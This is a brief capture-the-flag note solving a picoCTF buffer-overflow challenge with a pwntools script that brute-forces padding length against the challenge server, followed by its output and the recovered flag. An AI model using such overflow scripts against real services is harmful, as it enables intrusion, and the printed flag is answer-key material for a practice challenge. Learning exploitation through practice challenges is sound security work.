---
ai_date: 2025-04-27 05:29:46
ai_summary: "Brute-forced integer overflow with padding; found flag: picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}"
ai_tags:
  - overflow
  - brute-force
  - padding
created: 2024-08-08T02:36
updated: 2025-07-14T09:46
---

Brute force the overflow.

```python
from pwn import *
context.log_level = 'error'
# nc saturn.picoctf.net 57660
for i in range(100):
    r = remote('saturn.picoctf.net', 57660)
    r.sendlineafter(b': ', b'a'*i+p32(65))
    print(i, r.recvall())
    r.close()
```

```
23 b'\nnum is 0\nBye!\n'
24 b'\nnum is 65\nYou win!\npicoCTF{l0c4l5_1n_5c0p3_7bd3fee1}\n'
25 b'\nnum is 16737\nBye!\n'
```

Huh, it is not 16.
Maybe there is some padding?

```flag
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
```